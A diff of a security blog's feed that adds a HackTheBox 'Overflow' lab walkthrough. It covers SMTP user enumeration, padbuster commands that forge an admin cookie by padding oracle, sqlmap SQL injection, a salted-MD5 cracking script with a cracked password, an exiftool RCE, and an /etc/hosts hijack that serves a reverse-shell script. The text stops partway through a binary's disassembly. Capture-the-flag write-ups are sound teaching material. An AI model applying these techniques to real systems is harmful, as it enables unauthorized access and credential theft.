@@ -1,4 +1,910 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-04-02T08:48:13+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Shibboleth - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html" rel="alternate" type="text/html" title="Shibboleth - HackTheBox" /><published>2022-04-02T00:00:00+01:00</published><updated>2022-04-02T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/shibboleth</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/shibboleth.html"><![CDATA[<p><strong>Shibboleth</strong> is a relatively easy medium linux box. It’s running an instance of <em>Zabbix</em> which you can identify by bruteforcing for hidden subdomains. Once discovered, you need to exploit an ASF-RMCP/IPMI service running on UDP port <strong>623</strong> to extract and crack the hash of an administrator, which will give you access to the Zabbix dashboard. The box itself is configured as a Zabbix agent, so you can use this to gain code execution. Once inside, you will be moving laterally to another user through password reuse, and gain root access to the box thanks to a vulnerable MySQL service.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.2.1">Jekyll</generator><link href="https://4g3nt47.github.io/rss/feed.xml" rel="self" type="application/atom+xml" /><link href="https://4g3nt47.github.io/" rel="alternate" type="text/html" hreflang="en" /><updated>2022-04-09T15:37:26+01:00</updated><id>https://4g3nt47.github.io/rss/feed.xml</id><title type="html">4g3nt47</title><subtitle>A simple blog for InfoSec and other tech-related stuffs!</subtitle><entry><title type="html">Overflow - HackTheBox</title><link href="https://4g3nt47.github.io/posts/hackthebox/overflow.html" rel="alternate" type="text/html" title="Overflow - HackTheBox" /><published>2022-04-09T00:00:00+01:00</published><updated>2022-04-09T00:00:00+01:00</updated><id>https://4g3nt47.github.io/posts/hackthebox/overflow</id><content type="html" xml:base="https://4g3nt47.github.io/posts/hackthebox/overflow.html"><![CDATA[<p><strong>Overflow</strong> is an amazing <em>hard</em>-rated box on HackTheBox. To gain a foothold on the box, you will need to exploit an <em>oracle padding</em> vulnerability to gain access to an admin dashboard that’s vulnerable to <em>SQL injection</em>, use the <em>SQL injection</em> to retrieve and crack a hash for another domain, which is vulnerable to an <em>exiftool</em> RCE.</p>
+
+<p>There are two local users on the box; one accessible through password reuse, and the other due to a write privilege on an important system file. For privesc, you will be exploiting a classic <em>buffer overflow</em> on a custom binary with a non-excutable (NX) stack.</p>
+
+<p><br /></p>
+
+<h3 id="info">Info</h3>
+<p><br /></p>
+
+<p><img src="/assets/img/20220216103414.png" alt="" /></p>
+
+<p><img src="/assets/img/20220216103523.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="recon">Recon</h3>
+<p><br /></p>
+
+<h4 id="nmap">NMAP</h4>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td><td class="rouge-code"><pre># Nmap 7.70 scan initiated Thu Feb  3 03:04:42 2022 as: nmap -sC -sV -o nmap.txt -v overflow.htb
+Nmap scan report for overflow.htb (10.10.11.119)
+Host is up (0.23s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 eb:7c:15:8f:f2:cc:d4:26:54:c1:e1:57:0d:d5:b6:7c (RSA)
+|   256 d9:5d:22:85:03:de:ad:a0:df:b0:c3:00:aa:87:e8:9c (ECDSA)
+|_  256 fa:ec:32:f9:47:17:60:7e:e0:ba:b6:d1:77:fb:07:7b (ED25519)
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: overflow, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
+| ssl-cert: Subject: commonName=overflow
+| Subject Alternative Name: DNS:overflow
+| Issuer: commonName=overflow
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-05-17T10:41:37
+| Not valid after:  2031-05-15T10:41:37
+| MD5:   9bec 0c24 e822 f27b 0e0b be7a 1e42 90ca
+|_SHA-1: 4423 a65c ca82 e166 4a7e 1416 d759 111b 36b3 e532
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: Host:  overflow; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Feb  3 03:05:45 2022 -- 1 IP address (1 host up) scanned in 62.96 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="web">Web</h4>
+<p><br /></p>
+
+<p><img src="/assets/img/20220216103658.png" alt="" /></p>
+
+<p>There is a contact form at the bottom of the page;</p>
+
+<p><img src="/assets/img/20220216104043.png" alt="" /></p>
+
+<p>Filling and submitting the form generated a GET request to the site’s homepage without any of the parameters, so this is probably just another broken form as commonly seen in HTB boxes.</p>
+
+<p>There is a login page linked at the top of the homepage;</p>
+
+<p><img src="/assets/img/20220216104151.png" alt="" /></p>
+
+<p>This is submitted in a simple POST request with no tokens;</p>
+
+<p><img src="/assets/img/20220216104422.png" alt="" /></p>
+
+<p>Using the registration page, I was able to create an account and login to the site;</p>
+
+<p><img src="/assets/img/20220216104706.png" alt="" /></p>
+
+<p><img src="/assets/img/20220216104830.png" alt="" /></p>
+
+<p>There is nothing of much interest in the site even after login. The <em>blog</em> page linked to from the homepage after login has a few entries, but only the title seems valid. All the links are dead. The titles are: <em>Outdated Softwares</em>, <em>Buffer Overflows</em>, <em>Insecure File Uploads</em>, and <em>SQL Truncation Attacks</em>. This feels like a teaser for what’s about to come.</p>
+
+<p>Looking more closely at the homepage, I noticed a possible username <strong>ajmal</strong>;</p>
+
+<p><img src="/assets/img/20220216110013.png" alt="" /></p>
+
+<p>I tested if this username existed in the website, and it didn’t because I was able to create an account with it. However, the user <strong>admin</strong> may exist in the server because I was unable to register an account with it.</p>
+
+<p>Fuzzing the site for hidden subdomains didn’t yield any;</p>
+
+<p><img src="/assets/img/20220216114327.png" alt="" /></p>
+
+<p><br /></p>
+
+<h4 id="smtp">SMTP</h4>
+<p><br /></p>
+
+<p><code class="language-plaintext highlighter-rouge">nmap</code> scan on the host showed that SMTP is running on port <strong>25</strong>, and that the <code class="language-plaintext highlighter-rouge">vrfy</code> command is available, which could be used to enumerate valid users. The command showed that the user <code class="language-plaintext highlighter-rouge">root</code> exists on the host;</p>
+
+<p><img src="/assets/img/20220216111316.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code>, the following users were enumerated;</p>
+<ul>
+  <li>www-data</li>
+  <li>root</li>
+  <li>postfix</li>
+  <li>daemon</li>
+  <li>MAILER-DAEMON</li>
+  <li>list</li>
+  <li>news</li>
+  <li>nobody</li>
+  <li>mail</li>
+  <li>postmaster.</li>
+</ul>
+
+<p>These are all default user accounts, so nothing interesting.</p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">netcat</code>, I was able to send an email to the root user without any issues;</p>
+
+<p><img src="/assets/img/20220216112314.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="oracle-padding">Oracle Padding</h3>
+<p><br /></p>
+
+<p>I was convinced the titles of the blog entries are some sort of hints for solving this box. The only one that applies to the website at this stage is the <em>SQL Truncation attack</em>, so I decided to probe the account registration and login functions, since they are the only ways that let me send some data that is actually processed by the web application.</p>
+
+<p>Fuzzing the login parameters <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">password</code> for SQL-related attacks didn’t give me anything. However, the session cookie <code class="language-plaintext highlighter-rouge">auth</code> that is issued after authentication looks interesting because it looks like a URL encoded base64 string;</p>
+
+<p><img src="/assets/img/20220217162110.png" alt="" /></p>
+
+<p>URL-decoding and base64-decoding this, I get some string that appears to be encrypted. So I started fuzzing it manually through burp’s repeater.</p>
+
+<p>When adding a single character to the end of the cookie string, which could be anything, I was able to access the <code class="language-plaintext highlighter-rouge">/home/profile/</code> page which is protected by authentication. If I add more than one character at the end of the cookie, I get a <strong>302</strong> redirect to the login page with the parameter <code class="language-plaintext highlighter-rouge">err=1</code>;</p>
+
+<p><img src="/assets/img/20220217163117.png" alt="" /></p>
+
+<p>Going to the URL, I got an interesting message;</p>
+
+<p><img src="/assets/img/20220217163349.png" alt="" /></p>
+
+<p>It was at this point that I actually realised the web application is vulnerable to <em>Execute After Redirect (EAR)</em> vulnerability because the page is actually returned when making a request without the session cookie;</p>
+
+<p><img src="/assets/img/20220217164012.png" alt="" /></p>
+
+<p>Going back to the cookie, I noticed that adding anything to the begining of the cookie result in an error, with exception of few characters like <code class="language-plaintext highlighter-rouge">'</code>, <code class="language-plaintext highlighter-rouge">"</code>, or <code class="language-plaintext highlighter-rouge">+</code>.</p>
+
+<p>I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, but it couldn’t find anything. Testing for SQL truncation attack in the registration function with the aim of creating another account with the username <strong>admin</strong> (which seems to be already registered) didn’t work.</p>
+
+<p>I continue to fuzz the website for hidden paths in hope of finding one I can access due to the EAR flaw. Fuzzing the web root, I found the directory <strong>config</strong>;</p>
+
+<p><img src="/assets/img/20220218055109.png" alt="" /></p>
+
+<p>Fuzzing that directory, I got a few hits;</p>
+
+<p><img src="/assets/img/20220218055219.png" alt="" /></p>
+
+<p>All are just PHP pages, and didn’t give me anything. Bruteforcing the <code class="language-plaintext highlighter-rouge">/home</code> page found a new path <code class="language-plaintext highlighter-rouge">/home/logs.php</code>;</p>
+
+<p><img src="/assets/img/20220218060331.png" alt="" /></p>
+
+<p>Going to the page, I got an <strong>Unauthorized</strong> message. I get this <em>unauthorized</em> message even after logging in with my test account, so this page is probably only accessible by the <strong>admin</strong>.</p>
+
+<p>I was stuck on this for a while, and had to take a sanity check regarding the padding error I was getting when playing with the <code class="language-plaintext highlighter-rouge">auth</code> cookie. I was introduced to <em>Oracle Padding</em> attacks, which is something I’ve never heard before :(</p>
+
+<p>After reading up on such attacks at https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html and some other sites, I was able to decode the cookie issued to my test account using a tool called <code class="language-plaintext highlighter-rouge">padbuster</code> that automate this process.</p>
+
+<p>To use <code class="language-plaintext highlighter-rouge">padbuster</code>, you need to at least supply the target URL, the encrypted string, and the block size. The url in this case is any page that process the cookie, so I chose <code class="language-plaintext highlighter-rouge">/home/profile/</code>. The encrypted string is the cookie value I got after login, and the block size is <strong>8</strong> since the base64-decoded cookie always gives 24 characters, which is a multiple of <strong>8</strong>.</p>
+
+<p>With this info, I was able to decrypt the cookie I was issued using the command;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>padbuster http://overflow.htb/home/profile/ 6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9 8 <span class="nt">-cookies</span> <span class="s2">"auth=6Z6ZTuDzahDyKTS9eEOqd47obCHki8m9"</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It took quite a while, but it worked;</p>
+
+<p><img src="/assets/img/20220218130956.png" alt="" /></p>
+
+<p>Using the command, I was able to craft a cookie with <code class="language-plaintext highlighter-rouge">user=admin</code>;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>padbuster http://overflow.htb/home/profile/ RhNgaMySdgdBgb3N7iuvOM25sELhCZ72 8 <span class="nt">-cookies</span> <span class="s2">"auth=RhNgaMySdgdBgb3N7iuvOM25sELhCZ72"</span> <span class="nt">-plaintext</span> <span class="s2">"user=admin"</span> <span class="nt">-verbose</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><img src="/assets/img/20220219081330.png" alt="" /></p>
+
+<p>Loading the homepage using this cookie, I noticed two new links in the homepage;</p>
+
+<p><img src="/assets/img/20220219081749.png" alt="" /></p>
+
+<p>Clicking on <code class="language-plaintext highlighter-rouge">Logs</code> just gave me a little popup;</p>
+
+<p><img src="/assets/img/20220219081834.png" alt="" /></p>
+
+<p>Clicking the <code class="language-plaintext highlighter-rouge">Admin panel</code>, I was presented with a login form;</p>
+
+<p><img src="/assets/img/20220219082100.png" alt="" /></p>
+
+<p>Trying some common defaults for the login didn’t work. Checking burp to see how the <code class="language-plaintext highlighter-rouge">/home/logs.php</code> works, I noticed that it passes a GET parameter <code class="language-plaintext highlighter-rouge">name</code> with the value set to <code class="language-plaintext highlighter-rouge">admin</code>. Adding a single quote to test for <em>SQL Injection</em> gave a <strong>500 Internal Server Error</strong>. So I dumped the request to a text file and gave it to <code class="language-plaintext highlighter-rouge">sqlmap</code>, and it turns out to be vulnerable;</p>
+
+<p><img src="/assets/img/20220219084125.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="sql-injection">SQL Injection</h3>
+<p><br /></p>
+
+<p>Available databases;</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre>[*] cmsmsdb
+[*] information_schema
+[*] logs
+[*] Overflow
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Tables for <code class="language-plaintext highlighter-rouge">cmsmsdb</code>;</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td><td class="rouge-code"><pre>Database: cmsmsdb
+[47 tables]
++-----------------------------+
+| cms_additional_users        |
+---[snip]---
+| cms_user_groups             |
+| cms_userplugins             |
+| cms_userplugins_seq         |
+| cms_userprefs               |
+| cms_users                   |
+| cms_users_seq               |
+| cms_version                 |
++-----------------------------+
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The table <code class="language-plaintext highlighter-rouge">cms_users</code> contains two hashes;</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>EMAIL</th>
+      <th>USERNAME</th>
+      <th>PASSWORD</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>admin@overflow.htb</td>
+      <td>admin</td>
+      <td>c6c6b9310e0e6f3eb3ffeb2baff12fdd</td>
+    </tr>
+    <tr>
+      <td> </td>
+      <td>editor</td>
+      <td>e3d748d58b58657bfa4dffe2def0b1c7</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Feeding these 2 hashes to <code class="language-plaintext highlighter-rouge">john</code>, I was unable to crack any using <code class="language-plaintext highlighter-rouge">rockyou.txt</code>. This is probably just a rabbit hole, or the hashes could be salted. So I tried using the <code class="language-plaintext highlighter-rouge">--file-read</code> flag of <code class="language-plaintext highlighter-rouge">sqlmap</code> to see if I can read local files, and I couldn’t.</p>
+
+<p>I dumped the whole database using <code class="language-plaintext highlighter-rouge">sqlmap</code> and start going through the records locally in hope of finding something. Searching for the domain name in the records dumped by <code class="language-plaintext highlighter-rouge">sqlmap</code>, I found one;</p>
+
+<p><img src="/assets/img/20220219114511.png" alt="" /></p>
+
+<p>Going to the page, I got another login form;</p>
+
+<p><img src="/assets/img/20220219114720.png" alt="" /></p>
+
+<p>After a lot of digging, I found a hex-encoded string that could be a salt in the table <code class="language-plaintext highlighter-rouge">cms_siteprefs</code>(<em>mask</em> is another name for a salt);</p>
+
+<p><img src="/assets/img/20220219115141.png" alt="" /></p>
+
+<p>I was unable to get <code class="language-plaintext highlighter-rouge">john</code> to work with the hash, so I wrote a simple script;</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python
+</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
+
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">4</span><span class="p">:</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Usage: %s &lt;hash&gt; &lt;salt&gt; &lt;wordlist&gt;"</span> <span class="o">%</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+  <span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+
+<span class="n">wordlist</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+<span class="k">if</span> <span class="ow">not</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">exists</span><span class="p">(</span><span class="n">wordlist</span><span class="p">):</span>
+  <span class="k">print</span><span class="p">(</span><span class="s">"[-] Invalid wordlist: "</span> <span class="o">+</span> <span class="n">wordlist</span><span class="p">)</span>
+  <span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">wordlist</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"[*] Bruteforcing hash..."</span><span class="p">);</span>
+<span class="nb">hash</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">salt</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+  <span class="n">word</span> <span class="o">=</span> <span class="n">wordlist</span><span class="p">.</span><span class="n">readline</span><span class="p">()</span>
+  <span class="k">if</span> <span class="ow">not</span> <span class="n">word</span><span class="p">:</span> <span class="c1"># Wordlist exhausted.
+</span>    <span class="k">break</span>
+  <span class="n">word</span> <span class="o">=</span> <span class="n">word</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span>
+  <span class="k">if</span> <span class="n">md5</span><span class="p">(</span><span class="n">salt</span> <span class="o">+</span> <span class="n">word</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">==</span> <span class="nb">hash</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[+] Success: "</span> <span class="o">+</span> <span class="n">word</span><span class="p">)</span>
+    <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"[-] Unable to crack!"</span><span class="p">)</span>
+<span class="nb">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I saved the above as <code class="language-plaintext highlighter-rouge">md5-salt-brute.py</code>, and ran it. I was able to crack the hash of the user <strong>editor</strong>;</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span><span class="nb">cat </span>hashes.john    
+admin:c6c6b9310e0e6f3eb3ffeb2baff12fdd   
+editor:e3d748d58b58657bfa4dffe2def0b1c7
+admin<span class="o">(</span>overflow<span class="o">)</span>:c71d60439ed5590b3c5e99d95ed48165
+agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py c6c6b9310e0e6f3eb3ffeb2baff12fdd 6c2d17f37e226486 /wordlists/rockyou.txt                                
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...                   
+<span class="o">[</span>-] Unable to crack!                
+agent47@debian:<span class="nv">$ </span>./md5-salt-brute.py e3d748d58b58657bfa4dffe2def0b1c7 6c2d17f37e226486 /wordlists/rockyou.txt                                
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Bruteforcing hash...        
+<span class="o">[</span>+] Success: alpha!@#<span class="nv">$%</span>bravo                 
+agent47@debian:<span class="err">$</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>This is the only hash I could crack, but it gave me access to <strong>devbuild-job.overflow.htb</strong>;</p>
+
+<p><img src="/assets/img/20220219124740.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="devbuild-joboverflowhtb">devbuild-job.overflow.htb</h3>
+<p><br /></p>
+
+<p>Almost all the links in the dashboard are dead. The profile page has a form that allows users to upload a <em>resume</em>;</p>
+
+<p><img src="/assets/img/20220223084146.png" alt="" /></p>
+
+<p>Uploading a .png file, which is not part of the listed formats, gave a <strong>File Type Not supported</strong> error that appeared only briefly.</p>
+
+<p>Playing with the request in burp’s repeater, I found out the web application may be depending on the file extension for validation, as changing the upload file name of a .png file succeeded, and showed what looks like an output of <code class="language-plaintext highlighter-rouge">exiftool</code>, along with the path the files are uploaded to;</p>
+
+<p><img src="/assets/img/20220223085028.png" alt="" /></p>
+
+<p>Exiftool has an RCE vulnerability tracked as <strong>CVE-2021-22204</strong>, and there is a PoC in the GitHub repo https://github.com/convisolabs/CVE-2021-22204-exiftool. Using it, I was able to spawn a shell on the box as <strong>www-data</strong>;</p>
+
+<p><img src="/assets/img/20220223085941.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="user">User</h3>
+<p><br /></p>
+
+<p>Inside the box as <strong>www-data</strong>, I found two local users; <strong>developer</strong>, and <strong>tester</strong>. The user <strong>tester</strong> is the one that hold the user flag. The configuration files of the site <strong>devbuild-job.overflow.htb</strong> has a MySQL credential;</p>
+
+<p><img src="/assets/img/20220223090438.png" alt="" /></p>
+
+<p>The password is not reused by any of the local users. The main site <strong>overflow.htb</strong> also has a MySQL credential;</p>
+
+<p><img src="/assets/img/20220223090806.png" alt="" /></p>
+
+<p>Testing this password against the local user account of <strong>developer</strong> worked, and I was able to login over SSH;</p>
+
+<p><img src="/assets/img/20220223091047.png" alt="" /></p>
+
+<p><br /></p>
+
+<h4 id="developer">Developer</h4>
+<p><br /></p>
+
+<p>The user does not have any <code class="language-plaintext highlighter-rouge">sudo</code> permissions, but they belong to a group called <strong>network</strong>. Searching for files that belong to this group, I got one very interesting match;</p>
+
+<p><img src="/assets/img/20220223092838.png" alt="" /></p>
+
+<p>I have write permissions on a very important file. If I can find any service that’s making some requests to a hostname, I can edit the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file so that the hostname resolves to an address I control.</p>
+
+<p>So I uploaded <code class="language-plaintext highlighter-rouge">pspy</code> to the box, and it picked up a download using <code class="language-plaintext highlighter-rouge">curl</code> for a shell script on the site <strong>taskmanage.overflow.htb</strong>;</p>
+
+<p><img src="/assets/img/20220223094110.png" alt="" /></p>
+
+<p>So I created a file named <code class="language-plaintext highlighter-rouge">task.sh</code> with a reverse shell payload on my box, and hosted it using python’s <code class="language-plaintext highlighter-rouge">http.server</code> module. I then edited the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file on the box and mapped the domain <strong>taskmanage.overflow.htb</strong> to my IP;</p>
+
+<p><img src="/assets/img/20220223094534.png" alt="" /></p>
+
+<p>After a few seconds, the file was downloaded from my attack box, and executed, which gave me access to the box as <strong>tester</strong>;</p>
+
+<p><img src="/assets/img/20220223094835.png" alt="" /></p>
+
+<p><br /></p>
+
+<hr />
+<h3 id="privesc">PrivEsc</h3>
+<p><br /></p>
+
+<p>I cannot view <code class="language-plaintext highlighter-rouge">sudo</code> permission for the user <strong>tester</strong> as I still don’t have their password, and the user does not belong to any other group.</p>
+
+<p>Going through the filesystem, I found a SUID binary at <code class="language-plaintext highlighter-rouge">/opt/file_encrypt</code>;</p>
+
+<p><img src="/assets/img/20220223095648.png" alt="" /></p>
+
+<p>Running the binary, I was prompted for a PIN;</p>
+
+<p><img src="/assets/img/20220223095808.png" alt="" /></p>
+
+<p>So I shipped the binary to my attack box for analysis.</p>
+
+<p><br /></p>
+
+<h4 id="analysis-file_encrypt">Analysis: file_encrypt</h4>
+<p><br /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre></td><td class="rouge-code"><pre>agent47@debian:<span class="nv">$ </span>rabin2 <span class="nt">-I</span> file_encrypt 
+<span class="nb">arch     </span>x86
+baddr    0x0
+binsz    10741
+bintype  elf
+bits     32
+canary   <span class="nb">false
+</span>class    ELF32
+compiler GCC: <span class="o">(</span>Ubuntu 7.5.0-3ubuntu1~18.04<span class="o">)</span> 7.5.0
+crypto   <span class="nb">false
+</span>endian   little
+havecode <span class="nb">true
+</span>intrp    /lib/ld-linux.so.2
+laddr    0x0
+lang     c
+linenum  <span class="nb">true
+</span>lsyms    <span class="nb">true
+</span>machine  Intel 80386
+nx       <span class="nb">true
+</span>os       linux
+pic      <span class="nb">true
+</span>relocs   <span class="nb">true
+</span>relro    full
+rpath    NONE
+sanitize <span class="nb">false
+</span>static   <span class="nb">false
+</span>stripped <span class="nb">false
+</span>subsys   linux
+va       <span class="nb">true</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">main</code> function is calling <code class="language-plaintext highlighter-rouge">check_pin()</code>, which is likely the function doing PIN validation;</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+</pre></td><td class="rouge-code"><pre>[0x00000b62]&gt; pdf
+╭ 46: int main (char **argv);
+│           ; arg char **argv @ esp+0x14
+│           0x00000b62      8d4c2404       lea ecx, [argv]
+│           0x00000b66      83e4f0         and esp, 0xfffffff0
+│           0x00000b69      ff71fc         push dword [ecx - 4]
+│           0x00000b6c      55             push ebp
+│           0x00000b6d      89e5           mov ebp, esp
+│           0x00000b6f      51             push ecx
+│           0x00000b70      83ec04         sub esp, 4
+│           0x00000b73      e818000000     call sym.__x86.get_pc_thunk.ax
+│           0x00000b78      0528240000     add eax, 0x2428
+│           0x00000b7d      e82effffff     call sym.check_pin
+│           0x00000b82      b800000000     mov eax, 0
+│           0x00000b87      83c404         add esp, 4
+│           0x00000b8a      59             pop ecx
+│           0x00000b8b      5d             pop ebp
+│           0x00000b8c      8d61fc         lea esp, [ecx - 4]
+╰           0x00000b8f      c3             ret
+[0x00000b62]&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Disassembly of <code class="language-plaintext highlighter-rouge">sym.check_pin</code>;</p>
+
+<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+</pre></td><td class="rouge-code"><pre>[0x56602ab0]&gt; pdf                                                                                                                     
+            ; CALL XREF from main @ 0x56602b7d
+╭ 178: sym.check_pin ();
+│           ; var int32_t var_28h @ ebp-0x28
+│           ; var int32_t var_14h @ ebp-0x14                                                                                          
+│           ; var uint32_t var_10h @ ebp-0x10                                                                                         
+│           ; var int32_t var_ch @ ebp-0xc
+│           ; var int32_t var_4h @ ebp-0x4
+│           0x56602ab0      55             push ebp
+│           0x56602ab1      89e5           mov ebp, esp
+│           0x56602ab3      53             push ebx
+│           0x56602ab4      83ec24         sub esp, 0x24                                                                              
